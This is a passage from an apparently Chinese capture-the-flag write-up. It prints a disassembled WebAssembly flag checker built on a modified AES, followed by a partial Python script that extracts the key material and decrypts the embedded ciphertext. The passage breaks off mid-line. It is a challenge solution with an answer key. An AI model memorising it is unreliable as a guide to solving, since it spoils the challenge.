class="line">      local.get 7</span><br><span class="line">      i32.const -64</span><br><span class="line">      i32.sub</span><br><span class="line">      local.set 9</span><br><span class="line">      local.get 1</span><br><span class="line">      i32.const 48</span><br><span class="line">      i32.and</span><br><span class="line">      i32.const 16</span><br><span class="line">      i32.add</span><br><span class="line">      local.set 4</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 1</span><br><span class="line">        local.get 5</span><br><span class="line">        i32.eq</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          block  ;; label = @4</span><br><span class="line">            local.get 4</span><br><span class="line">            local.get 1</span><br><span class="line">            local.get 1</span><br><span class="line">            local.get 4</span><br><span class="line">            i32.lt_u</span><br><span class="line">            select</span><br><span class="line">            local.set 3</span><br><span class="line">            local.get 4</span><br><span class="line">            local.get 1</span><br><span class="line">            i32.sub</span><br><span class="line">            local.set 0</span><br><span class="line">            loop  ;; label = @5</span><br><span class="line">              local.get 1</span><br><span class="line">              local.get 3</span><br><span class="line">              i32.eq</span><br><span class="line">              br_if 1 (;@4;)</span><br><span class="line">              local.get 1</span><br><span class="line">              local.get 9</span><br><span class="line">              i32.add</span><br><span class="line">              local.get 0</span><br><span class="line">              i32.store8</span><br><span class="line">              local.get 1</span><br><span class="line">              i32.const 1</span><br><span class="line">              i32.add</span><br><span class="line">              local.set 1</span><br><span class="line">              br 0 (;@5;)</span><br><span class="line">            end</span><br><span class="line">            unreachable</span><br><span class="line">          end</span><br><span class="line">        else</span><br><span class="line">          local.get 5</span><br><span class="line">          local.get 9</span><br><span class="line">          i32.add</span><br><span class="line">          local.get 0</span><br><span class="line">          local.get 5</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          i32.store8</span><br><span class="line">          local.get 5</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 5</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      local.get 4</span><br><span class="line">      i32.const 32</span><br><span class="line">      i32.ne</span><br><span class="line">      br_if 0 (;@1;)</span><br><span class="line">      i32.const 0</span><br><span class="line">      local.set 1</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 1</span><br><span class="line">        i32.const 32</span><br><span class="line">        i32.lt_u</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          local.get 1</span><br><span class="line">          local.get 9</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 2</span><br><span class="line">          local.get 1</span><br><span class="line">          local.get 7</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 10</span><br><span class="line">          i32.const 0</span><br><span class="line">          local.set 0</span><br><span class="line">          global.get 0</span><br><span class="line">          i32.const 192</span><br><span class="line">          i32.sub</span><br><span class="line">          local.tee 6</span><br><span class="line">          global.set 0</span><br><span class="line">          loop  ;; label = @4</span><br><span class="line">            local.get 0</span><br><span class="line">            i32.const 16</span><br><span class="line">            i32.eq</span><br><span class="line">            if  ;; label = @5</span><br><span class="line">              i32.const 0</span><br><span class="line">              local.set 0</span><br><span class="line">              loop  ;; label = @6</span><br><span class="line">                local.get 0</span><br><span class="line">                i32.const 16</span><br><span class="line">                i32.eq</span><br><span class="line">                if  ;; label = @7</span><br><span class="line">                  block  ;; label = @8</span><br><span class="line">                    local.get 6</span><br><span class="line">                    i32.const 16</span><br><span class="line">                    i32.sub</span><br><span class="line">                    local.set 11</span><br><span class="line">                    i32.const 1</span><br><span class="line">                    local.set 5</span><br><span class="line">                    loop  ;; label = @9</span><br><span class="line">                      local.get 5</span><br><span class="line">                      i32.const 11</span><br><span class="line">                      i32.eq</span><br><span class="line">                      br_if 1 (;@8;)</span><br><span class="line">                      local.get 5</span><br><span class="line">                      i32.const 17</span><br><span class="line">                      i32.mul</span><br><span class="line">                      local.set 4</span><br><span class="line">                      i32.const 0</span><br><span class="line">                      local.set 0</span><br><span class="line">                      local.get 11</span><br><span class="line">                      local.get 5</span><br><span class="line">                      i32.const 4</span><br><span class="line">                      i32.shl</span><br><span class="line">                      local.tee 3</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.set 2</span><br><span class="line">                      loop  ;; label = @10</span><br><span class="line">                        local.get 0</span><br><span class="line">                        i32.const 16</span><br><span class="line">                        i32.eq</span><br><span class="line">                        if  ;; label = @11</span><br><span class="line">                          local.get 5</span><br><span class="line">                          i32.const 1</span><br><span class="line">                          i32.add</span><br><span class="line">                          local.set 5</span><br><span class="line">                          br 2 (;@9;)</span><br><span class="line">                        else</span><br><span class="line">                          local.get 3</span><br><span class="line">                          local.get 6</span><br><span class="line">                          i32.add</span><br><span class="line">                          local.get 0</span><br><span class="line">                          i32.add</span><br><span class="line">                          local.get 4</span><br><span class="line">                          local.get 0</span><br><span class="line">                          local.get 2</span><br><span class="line">                          i32.add</span><br><span class="line">                          i32.load8_u</span><br><span class="line">                          i32.xor</span><br><span class="line">                          local.get 0</span><br><span class="line">                          i32.xor</span><br><span class="line">                          i32.store8</span><br><span class="line">                          local.get 0</span><br><span class="line">                          i32.const 1</span><br><span class="line">                          i32.add</span><br><span class="line">                          local.set 0</span><br><span class="line">                          br 1 (;@10;)</span><br><span class="line">                        end</span><br><span class="line">                        unreachable</span><br><span class="line">                      end</span><br><span class="line">                      unreachable</span><br><span class="line">                    end</span><br><span class="line">                    unreachable</span><br><span class="line">                  end</span><br><span class="line">                else</span><br><span class="line">                  local.get 0</span><br><span class="line">                  local.get 6</span><br><span class="line">                  i32.add</span><br><span class="line">                  local.get 0</span><br><span class="line">                  local.get 8</span><br><span class="line">                  i32.add</span><br><span class="line">                  i32.load8_u</span><br><span class="line">                  i32.store8</span><br><span class="line">                  local.get 0</span><br><span class="line">                  i32.const 1</span><br><span class="line">                  i32.add</span><br><span class="line">                  local.set 0</span><br><span class="line">                  br 1 (;@6;)</span><br><span class="line">                end</span><br><span class="line">              end</span><br><span class="line">              local.get 6</span><br><span class="line">              i32.const 176</span><br><span class="line">              i32.add</span><br><span class="line">              local.get 6</span><br><span class="line">              call 3</span><br><span class="line">              i32.const 1</span><br><span class="line">              local.set 0</span><br><span class="line">              loop  ;; label = @6</span><br><span class="line">                local.get 0</span><br><span class="line">                i32.const 11</span><br><span class="line">                i32.eq</span><br><span class="line">                if  ;; label = @7</span><br><span class="line">                  block  ;; label = @8</span><br><span class="line">                    i32.const 0</span><br><span class="line">                    local.set 0</span><br><span class="line">                    loop  ;; label = @9</span><br><span class="line">                      local.get 0</span><br><span class="line">                      i32.const 16</span><br><span class="line">                      i32.eq</span><br><span class="line">                      br_if 1 (;@8;)</span><br><span class="line">                      local.get 0</span><br><span class="line">                      local.get 10</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.get 6</span><br><span class="line">                      i32.const 176</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.get 0</span><br><span class="line">                      i32.add</span><br><span class="line">                      i32.load8_u</span><br><span class="line">                      i32.store8</span><br><span class="line">                      local.get 0</span><br><span class="line">                      i32.const 1</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.set 0</span><br><span class="line">                      br 0 (;@9;)</span><br><span class="line">                    end</span><br><span class="line">                    unreachable</span><br><span class="line">                  end</span><br><span class="line">                else</span><br><span class="line">                  local.get 6</span><br><span class="line">                  i32.const 176</span><br><span class="line">                  i32.add</span><br><span class="line">                  local.set 2</span><br><span class="line">                  i32.const 0</span><br><span class="line">                  local.set 4</span><br><span class="line">                  loop  ;; label = @8</span><br><span class="line">                    local.get 4</span><br><span class="line">                    i32.const 16</span><br><span class="line">                    i32.ne</span><br><span class="line">                    if  ;; label = @9</span><br><span class="line">                      local.get 2</span><br><span class="line">                      local.get 4</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.tee 3</span><br><span class="line">                      local.get 3</span><br><span class="line">                      i32.load8_u</span><br><span class="line">                      i32.const 1056</span><br><span class="line">                      i32.add</span><br><span class="line">                      i32.load8_u</span><br><span class="line">                      i32.store8</span><br><span class="line">                      local.get 4</span><br><span class="line">                      i32.const 1</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.set 4</span><br><span class="line">                      br 1 (;@8;)</span><br><span class="line">                    end</span><br><span class="line">                  end</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=1</span><br><span class="line">                  local.set 4</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=5</span><br><span class="line">                  i32.store8 offset=1</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=9</span><br><span class="line">                  local.set 3</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=13</span><br><span class="line">                  i32.store8 offset=9</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 3</span><br><span class="line">                  i32.store8 offset=5</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 4</span><br><span class="line">                  i32.store8 offset=13</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=2</span><br><span class="line">                  local.set 3</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=10</span><br><span class="line">                  i32.store8 offset=2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 3</span><br><span class="line">                  i32.store8 offset=10</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=6</span><br><span class="line">                  local.set 3</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=14</span><br><span class="line">                  i32.store8 offset=6</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 3</span><br><span class="line">                  i32.store8 offset=14</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=15</span><br><span class="line">                  local.set 3</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=11</span><br><span class="line">                  i32.store8 offset=15</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=7</span><br><span class="line">                  i32.store8 offset=11</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=3</span><br><span class="line">                  i32.store8 offset=7</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 3</span><br><span class="line">                  i32.store8 offset=3</span><br><span class="line">                  local.get 0</span><br><span class="line">                  i32.const 10</span><br><span class="line">                  i32.ne</span><br><span class="line">                  if  ;; label = @8</span><br><span class="line">                    local.get 2</span><br><span class="line">                    call 4</span><br><span class="line">                    local.get 2</span><br><span class="line">                    i32.const 4</span><br><span class="line">                    i32.add</span><br><span class="line">                    call 4</span><br><span class="line">                    local.get 2</span><br><span class="line">                    i32.const 8</span><br><span class="line">                    i32.add</span><br><span class="line">                    call 4</span><br><span class="line">                    local.get 2</span><br><span class="line">                    i32.const 12</span><br><span class="line">                    i32.add</span><br><span class="line">                    call 4</span><br><span class="line">                  end</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 6</span><br><span class="line">                  local.get 0</span><br><span class="line">                  i32.const 4</span><br><span class="line">                  i32.shl</span><br><span class="line">                  i32.add</span><br><span class="line">                  call 3</span><br><span class="line">                  local.get 0</span><br><span class="line">                  i32.const 1</span><br><span class="line">                  i32.add</span><br><span class="line">                  local.set 0</span><br><span class="line">                  br 1 (;@6;)</span><br><span class="line">                end</span><br><span class="line">              end</span><br><span class="line">              local.get 6</span><br><span class="line">              i32.const 192</span><br><span class="line">              i32.add</span><br><span class="line">              global.set 0</span><br><span class="line">            else</span><br><span class="line">              local.get 6</span><br><span class="line">              i32.const 176</span><br><span class="line">              i32.add</span><br><span class="line">              local.get 0</span><br><span class="line">              i32.add</span><br><span class="line">              local.get 0</span><br><span class="line">              local.get 2</span><br><span class="line">              i32.add</span><br><span class="line">              i32.load8_u</span><br><span class="line">              i32.store8</span><br><span class="line">              local.get 0</span><br><span class="line">              i32.const 1</span><br><span class="line">              i32.add</span><br><span class="line">              local.set 0</span><br><span class="line">              br 1 (;@4;)</span><br><span class="line">            end</span><br><span class="line">          end</span><br><span class="line">          local.get 1</span><br><span class="line">          i32.const 16</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 1</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      i32.const 0</span><br><span class="line">      local.set 1</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 1</span><br><span class="line">        local.tee 0</span><br><span class="line">        i32.const 32</span><br><span class="line">        i32.ne</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          local.get 0</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 1</span><br><span class="line">          local.get 0</span><br><span class="line">          local.get 7</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 0</span><br><span class="line">          i32.const 1312</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          i32.eq</span><br><span class="line">          br_if 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      local.get 0</span><br><span class="line">      i32.const 31</span><br><span class="line">      i32.gt_u</span><br><span class="line">      local.set 2</span><br><span class="line">    end</span><br><span class="line">    local.get 7</span><br><span class="line">    i32.const 144</span><br><span class="line">    i32.add</span><br><span class="line">    global.set 0</span><br><span class="line">    local.get 2)</span><br><span class="line">  (func (;2;) (type 3) (param i32 i32 i32) (result i32)</span><br><span class="line">    local.get 2</span><br><span class="line">    i32.const -23</span><br><span class="line">    i32.mul</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 1</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.add</span><br><span class="line">    i32.const 255</span><br><span class="line">    i32.and)</span><br><span class="line">  (func (;3;) (type 4) (param i32 i32)</span><br><span class="line">    (local i32 i32)</span><br><span class="line">    loop  ;; label = @1</span><br><span class="line">      local.get 2</span><br><span class="line">      i32.const 16</span><br><span class="line">      i32.ne</span><br><span class="line">      if  ;; label = @2</span><br><span class="line">        local.get 0</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.add</span><br><span class="line">        local.tee 3</span><br><span class="line">        local.get 3</span><br><span class="line">        i32.load8_u</span><br><span class="line">        local.get 1</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.add</span><br><span class="line">        i32.load8_u</span><br><span class="line">        i32.xor</span><br><span class="line">        i32.store8</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.set 2</span><br><span class="line">        br 1 (;@1;)</span><br><span class="line">      end</span><br><span class="line">    end)</span><br><span class="line">  (func (;4;) (type 0) (param i32)</span><br><span class="line">    (local i32 i32 i32 i32 i32 i32 i32)</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.load8_u offset=1</span><br><span class="line">    local.tee 2</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.load8_u</span><br><span class="line">    local.tee 3</span><br><span class="line">    i32.xor</span><br><span class="line">    local.tee 4</span><br><span class="line">    call 5</span><br><span class="line">    local.get 3</span><br><span class="line">    i32.xor</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.load8_u offset=2</span><br><span class="line">    local.tee 5</span><br><span class="line">    local.get 4</span><br><span class="line">    i32.xor</span><br><span class="line">    local.tee 6</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.load8_u offset=3</span><br><span class="line">    local.tee 1</span><br><span class="line">    i32.xor</span><br><span class="line">    local.tee 7</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.store8</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 2</span><br><span class="line">    local.get 5</span><br><span class="line">    i32.xor</span><br><span class="line">    call 5</span><br><span class="line">    local.get 2</span><br><span class="line">    i32.xor</span><br><span class="line">    local.get 7</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.store8 offset=1</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 1</span><br><span class="line">    local.get 5</span><br><span class="line">    i32.xor</span><br><span class="line">    call 5</span><br><span class="line">    local.get 1</span><br><span class="line">    i32.xor</span><br><span class="line">    local.get 4</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.store8 offset=2</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 1</span><br><span class="line">    local.get 3</span><br><span class="line">    i32.xor</span><br><span class="line">    call 5</span><br><span class="line">    local.get 6</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.store8 offset=3)</span><br><span class="line">  (func (;5;) (type 5) (param i32) (result i32)</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.extend8_s</span><br><span class="line">    i32.const 7</span><br><span class="line">    i32.shr_u</span><br><span class="line">    i32.const 27</span><br><span class="line">    i32.and</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.const 1</span><br><span class="line">    i32.shl</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.const 255</span><br><span class="line">    i32.and)</span><br><span class="line">  (func (;6;) (type 0) (param i32)</span><br><span class="line">    local.get 0</span><br><span class="line">    global.set 0)</span><br><span class="line">  (func (;7;) (type 6) (result i32)</span><br><span class="line">    global.get 0)</span><br><span class="line">  (table (;0;) 2 2 funcref)</span><br><span class="line">  (memory (;0;) 258 258)</span><br><span class="line">  (global (;0;) (mut i32) (i32.const 66880))</span><br><span class="line">  (export &quot;memory&quot; (memory 0))</span><br><span class="line">  (export &quot;check&quot; (func 1))</span><br><span class="line">  (export &quot;__indirect_function_table&quot; (table 0))</span><br><span class="line">  (export &quot;_initialize&quot; (func 0))</span><br><span class="line">  (export &quot;_emscripten_stack_restore&quot; (func 6))</span><br><span class="line">  (export &quot;emscripten_stack_get_current&quot; (func 7))</span><br><span class="line">  (elem (;0;) (i32.const 1) func 0)</span><br><span class="line">  (data (;0;) (i32.const 1024) &quot;\80\80XK\c6\16^\90\95\b56\aa^T\fe\9a\ab\cd\179^\82\f1Jc\b7,\90\d5\08\7f\e69&amp;-!\a815\9fj[=q\a4\8d\f1,\90\d8\93&#x27;\a0\03\1d\aa\f7\8e\f8\f5\c6\fe(\9a\ed\a7\c9|le\ad\96n\ff\bf\ab+\82kO^\9dy\99B\cc_\c0]H\da\b8\b1&#125;\e8/S\d9v@A4\00\fa\08a\8c\e9s\b9u\de\09\8bZ\b7z\a6\eb\010\91\e4c\10\16\02\95\8a\b5\f0\a1\19\17i\df\1f\a3X%\0af\c5\f2\0b\f9\1a\d5\c8\c7b\af\e6\ec\80&#123;J\a5\a9\88\97VI\b6\05\cd\1eM\9e\fd$g&gt;\07C):\db\15\86xp\ca\d2\1c\b4\e2N\84\04Q\81\bah`P\13\5c~\06\98\89\f68\cb\cf\be#\bd\92m7\d7\8f\14\f36\0c\ae\b0? \f4R\e0\22\7ftF\fc\ee\9c\b2\87.E\11\e7\d1\d0*d\ef&lt;\12Y\acT;o\0d\e3\dc\9bG\c4\bb\a2\c2K3\83\d4\ce\c1D\dd\b3\94\0fr\85\d6\fb\d3W\e5\bc\182\1b\c3wU\ea\0e\e1L\96&lt;\d1s/\ac\fe\c2\00V\e1&amp;4\9a\e1/\b5O\a3\86\fb\87\f8\91\0a\9b\00\fb\0f\8d$w&quot;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有实力的大佬请尽情享受几百行的汇编……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 1. 准确解析 WAT 中的 data 段 (起始地址 1024)</span></span><br><span class="line">    wat_str = <span class="string">r&quot;\80\80XK\c6\16^\90\95\b56\aa^T\fe\9a\ab\cd\179^\82\f1Jc\b7,\90\d5\08\7f\e69&amp;-!\a815\9fj[=q\a4\8d\f1,\90\d8\93&#x27;\a0\03\1d\aa\f7\8e\f8\f5\c6\fe(\9a\ed\a7\c9|le\ad\96n\ff\bf\ab+\82kO^\9dy\99B\cc_\c0]H\da\b8\b1&#125;\e8/S\d9v@A4\00\fa\08a\8c\e9s\b9u\de\09\8bZ\b7z\a6\eb\010\91\e4c\10\16\02\95\8a\b5\f0\a1\19\17i\df\1f\a3X%\0af\c5\f2\0b\f9\1a\d5\c8\c7b\af\e6\ec\80&#123;J\a5\a9\88\97VI\b6\05\cd\1eM\9e\fd$g&gt;\07C):\db\15\86xp\ca\d2\1c\b4\e2N\84\04Q\81\bah`P\13\5c~\06\98\89\f68\cb\cf\be#\bd\92m7\d7\8f\14\f36\0c\ae\b0? \f4R\e0\22\7ftF\fc\ee\9c\b2\87.E\11\e7\d1\d0*d\ef&lt;\12Y\acT;o\0d\e3\dc\9bG\c4\bb\a2\c2K3\83\d4\ce\c1D\dd\b3\94\0fr\85\d6\fb\d3W\e5\bc\182\1b\c3wU\ea\0e\e1L\96&lt;\d1s/\ac\fe\c2\00V\e1&amp;4\9a\e1/\b5O\a3\86\fb\87\f8\91\0a\9b\00\fb\0f\8d$w&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_wat_data</span>(<span class="params">s</span>):</span><br><span class="line">        res = <span class="built_in">bytearray</span>()</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(s):</span><br><span class="line">            <span class="keyword">if</span> s[i] == <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">                res.append(<span class="built_in">int</span>(s[i+<span class="number">1</span>:i+<span class="number">3</span>], <span class="number">16</span>))</span><br><span class="line">                i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(<span class="built_in">ord</span>(s[i]))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line"></span><br><span class="line">    blob = parse_wat_data(wat_str)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 生成 Round Key 0 (Base Key)</span></span><br><span class="line">    base_key = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        xor_part = blob[i] ^ blob[i+<span class="number">16</span>]</span><br><span class="line">        base_key[i] = (xor_part + (-<span class="number">23</span> * i)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 递推生成所有轮密钥 (0-10)</span></span><br><span class="line">    round_keys = [<span class="built_in">bytes</span>(base_key)]</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        prev_key = round_keys[-<span class="number">1</span>]</span><br><span class="line">        curr_key = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            curr_key[i] = (prev_key[i] ^ (r * <span class="number">17</span>) ^ i) &amp; <span class="number">0xFF</span></span><br><span class="line">        round_keys.append(<span class="built_in">bytes</span>(curr_key))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 提取 S 盒与 32 字节密文</span></span><br><span class="line">    sbox = <span class="built_in">list</span>(blob[<span class="number">32</span>:<span class="number">288</span>])</span><br><span class="line">    rsbox = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(sbox): rsbox[v] = i</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 密文从偏移 288 开始，长度 32</span></span><br><span class="line">    full_ciphertext = blob[<span class="number">288</span>:<span class="number">320</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. AES 逆向工具函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv_shift_rows</span>(<span class="params">s</span>):</span><br><span class="line">        <span class="keyword">return</span> [s[<span class="number">0</span>], s[<span class="number">13</span>], s[<span class="number">10</span>], s[<span class="number">7</span>], s[<span class="number">4</span>], s[<span class="number">1</span>], s[<span class="number">14</span>], s[<span class="number">11</span>], s[<span class="number">8</span>], s[<span class="number">5</span>], s[<span class="number">2</span>], s[<span class="number">15</span>], s[<span class="number">12</span>], s[<span class="number">9</span>], s[<span class="number">6</span>], s[<span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xtime</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">return</span> ((x &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span> <span class="keyword">if</span> (x &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (x &lt;&lt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y</span>):</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (y &gt;&gt; i) &amp; <span class="number">1</span>: res ^= x</span><br><span class="line">            x = xtime(x)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv_mix_columns</span>(<span class="params">s</span>):</span><br><span class="line">        ns = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">            c = s[i:i+<span class="number">4</span>]</span><br><span class="line">            ns[i+<span class="number">0</span>] = mul(c[<span class="number">0</span>], <span class="number">14</span>) ^ mul(c[<span class="number">1</span>], <span class="number">11</span>) ^ mul(c[<span class="number">2</span>], <span class="number">13</span>) ^ mul(c[<span class="number">3</span>], <span class="number">9</span>)</span><br><span class="line">            ns[i+<span class="number">1</span>] = mul(c[<span class="number">0</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">1</span>], <span class="number">14</span>) ^ mul(c[<span class="number">2</span>], <span class="number">11</span>) ^ mul(c[<span class="number">3</span>], <span class="number">13</span>)</span><br><span class="line">            ns[i+<span class="number">2</span>] = mul(c[<span class="number">0</span>], <span class="number">13</span>) ^ mul(c[<span class="number">1</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">2</span>], <span class="number">14</span>) ^ mul(c[<span class="number">3</span>], <span class="number">11</span>)</span><br><span class="line">            ns[i+<span class="number">3</span>] = mul(c[<span class="number">0</span>], <span class="number">11</span>) ^ mul(c[<span class="number">1</span>], <span class="number">13</span>) ^ mul(c[<span class="number">2</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">3</span>], <span class="number">14</span>)</span><br><span class="line">        <span class="keyword">return</span> ns</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">block</span>):</span><br><span class="line">        state = [b ^ k <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(block, round_keys[<span class="number">10</span>])]</span><br><span class="line">        state = inv_shift_rows(state)</span><br><span class="line">        state = [rsbox[b] <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            state = [b ^ k <span class="keyword">for</span> b, k <span 